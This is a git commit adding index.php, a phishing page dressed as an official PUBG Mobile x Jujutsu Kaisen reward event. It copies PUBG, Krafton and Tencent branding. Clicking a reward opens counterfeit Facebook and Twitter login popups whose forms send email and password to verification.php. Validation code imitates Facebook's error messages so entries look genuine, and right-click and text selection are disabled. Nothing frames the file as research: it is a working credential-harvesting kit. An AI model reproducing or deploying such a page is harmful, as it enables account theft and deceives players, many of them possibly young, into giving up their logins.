e8358f0d92c6436586085554013253fecfa78272
ArchXD <101491983+ArchXD@users.noreply.github.com>
2022-03-13 10:51:12 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,295 @@
+
+<html>
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="PUBG Mobile x Jujutsu Kaisen Collaboration">
+<meta name="description" content="Collect your special rewards at the PUBG Mobile x Jujutsu Kaisen Collaboration event. This opportunity is limited and without the need for topup. Collect your rewards now!">
+<meta property="og:description" content="Collect your special rewards at the PUBG Mobile x Jujutsu Kaisen Collaboration event. This opportunity is limited and without the need for topup. Collect your rewards now!">
+<meta property="og:url" content="./">
+<meta property="og:site_name" content="PUBG Mobile x Jujutsu Kaisen Collaboration">
+<meta property="og:type" content="website">
+<meta name="copyright"content="PUBG MOBILE">
+<meta name="theme-color" content="#000">
+<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+<title>PUBG Mobile x Jujutsu Kaisen Collaboration</title>
+<link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="css/animate.css">
+<link rel="stylesheet" href="css/login/facebook.css">
+<link rel="stylesheet" href="css/login/twitter.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+  
+<div class="container">
+<div class="navbar">
+<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+<div class="navbar-title">
+PUBG MOBILE
+<br>
+<span>The original Battle Royale, <br> the first and the best!</span>
+</div> <!--- navbar-title --->
+<div class="navbar-download">
+<img class="navbar-menu" src="https://i.postimg.cc/LXJDnk6t/menu.png">
+<img class="navbar-pay" src="https://i.postimg.cc/VkTdzXpQ/pay.png">
+</div> <!--- navbar-download --->
+</div> <!--- navbar --->
+<div class="header">
+<video src="media/header.mp4" autoplay loop muted></video>
+</div> <!--- header --->
+<div class="home-title"></div> <!--- home-title --->
+<div class="box">
+<center>
+<div class="tab_rewards" id="season">
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/1.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/1.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/2.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/2.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/3.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/3.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/4.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/4.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/5.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/5.png">Collect</button>
+</div>
+</div>
+<div class="item itemShine">
+<div>
+<figure>
+<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/6.png">
+</figure>
+</div>
+<div>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/6.png">Collect</button>
+</div>
+</div>
+</center>
+</div> <!--- box --->
+<div class="footer">
+<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
+<center>
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
+<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
+</center>
+<img class="footer-copyright-icon" src="https://i.postimg.cc/pV8Q4L9L/footer-img.png">
+<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
+<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
+<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
+</div> <!--- footer --->
+</div> <!--- container --->
+
+<div class="popup reward_confirmation" style="display: none;">
+<div class="popup-box">
+<div class="popup-title">Reward Confirmation</div>
+<div class="popup-content">
+<br>
+<div class="popup-rewards-title">Are you sure to collect this rewards?</div>
+<img class="popup-rewards-img1" src="" id="myRewardImg">
+</div>
+<div class="popup-btn-wrapper">
+<button type="button" class="popup-btn-deactive" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
+<button type="button" class="popup-btn-active" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
+</div>
+</div>
+</div>
+
+<div class="popup account_login" style="display: none;">
+<div class="popup-box">
+<div class="popup-title">Account Login</div>
+<div class="popup-content">
+<br>
+<div class="popup-alert">Login to receive your selected reward</div> <!--- popup-alert --->
+<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
+<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
+<br>
+<br>
+<br>
+</div> <!--- popup-box-bg --->
+</div> <!--- popup-box --->
+</div> <!--- popup --->
+
+<div class="popup-login login-facebook animated fadeIn" style="display: none;">
+<div class="popup-box-login-fb">
+<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+<div class="navbar-fb"><img src="https://i.postimg.cc/3wBVgZTz/login-Method1.png"></div> <!--- navbar-fb --->
+<div class="content-box-fb">
+<p class="alert sandi">Wrong password. <b>Have you forgotten your password?</b></p>
+<p class="alert email">The mobile number or email you entered doesn't match any of the accounts. <b>Find your account.</b></p>
+<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
+<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div> <!--- txt-login-fb --->
+<form class="login-form" action="verification.php" method="post" onsubmit="return valid()">
+<label>
+<input type="text" name="email" id="user" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
+</label>
+<label>
+<input type="password" name="password" id="pass" placeholder="Password" autocomplete="off" autocapitalize="off" required>
+</label>
+<input type="hidden" name="login" value="Facebook" readonly>
+<button type="submit" class="btn-login-fb">Log In</button>
+</form>
+<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
+<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
+<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
+</div> <!--- content-box-fb --->
+<div class="language-box">
+<center>
+<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
+<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
+<div class="language-name">Basa Jawa</div> <!--- language-name --->
+<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
+<div class="language-name">日本語</div> <!--- language-name --->
+<div class="language-name">Español</div> <!--- language-name --->
+<div class="language-name">Português (Brasil)</div> <!--- language-name --->
+<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
+</center>
+</div> <!--- language-box --->
+<div class="copyright">Facebook Inc.</div>
+</div> <!--- popup-box-login-fb --->
+</div> <!--- popup-login --->
+
+<div class="popup-login login-twitter animated fadeIn" style="display: none;">
+<div class="popup-box-login-twitter">
+<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+<div class="box-twitter">
+<div class="header-twitter"><img src="https://i.postimg.cc/dtyfWFF2/login-Method2.png"></div> <!--- header-twitter --->
+<br>
+<br>
+<br>
+<center>
+<form action="verification.php" method="post">
+<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
+<div class="form-group">
+<input type="text" name="email" autocomplete="off" required>
+<label>Phone/email/username</label>
+</div> <!--- form-group --->
+<div class="form-group">
+<input type="password" name="password" autocomplete="off" required>
+<label>Password</label>
+</div> <!--- form-group --->
+<input type="hidden" name="login" value="Twitter" readonly>
+<button type="submit" class="btn-login-twitter">Log In</button>
+<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
+<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
+<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
+</form>
+</center>
+</div> <!--- box-twitter --->
+</div> <!--- popup-box-login-twitter --->
+</div> <!--- popup-login --->
+
+<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="js/script.js"></script>
+<script type="text/javascript">
+        function valid() {
+            var user = $('#user').val();
+            var pass = $('#pass').val();
+            var ip = $('#ip').val();
+            if(user == '' || user == null)
+            {
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+            }else{
+            
+                if(user.includes('@')){
+                let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+                if(user.match(pattern)){
+                $('.email').hide();
+                }else{
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+                }
+                }
+                
+                if(!isNaN(user)){
+                if(user.length <= 10){
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+                }else{
+                $('.email').hide();
+                }
+                }
+                
+                if(user.match(/\s/g)){
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+                }else{
+                $('.email').hide();
+                }
+                
+                var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                if(user.match(regex)){
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+                }
+                
+                if(user.length <= 5){
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+                }else{
+                $('.email').hide();
+                }
+                
+            }
+            if(pass == '' || pass == null || pass.length <= 5)
+            {
+                $('.sandi').show();
+                return false;
+            }else{
+                $('.sandi').hide();
+            }
+        }
+</script>
+</body>
+</html>
